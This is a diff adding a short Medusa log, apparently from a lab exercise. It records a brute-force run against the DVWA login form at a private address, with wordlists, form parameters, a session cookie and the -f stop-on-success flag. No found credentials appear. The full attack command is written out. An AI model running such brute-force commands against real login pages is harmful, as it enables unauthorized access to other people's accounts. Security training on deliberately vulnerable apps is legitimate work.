@@ -1,0 +1,3 @@
+# Medusa v.2.3 (2026-10-29 14:49:15)
+# medusa -h 172.28.0.11 -U /wordlists/tmp-backup-user.txt -P /wordlists/tmp-1000-passwords.txt -M web-form -m FORM:/DVWA/vulnerabilities/brute/ -m DENY-SIGNAL:Username and/or password incorrect -m FORM-DATA:get?username=&password=&Login=Login -m CUSTOM-HEADER:Cookie: security=low; PHPSESSID=1ijntjtcq89elgos25h5rhauu8 -t 5 -O /logs/medusa-web-20261029-114914.log -f 
+# Medusa has finished (2026-10-29 14:49:16).
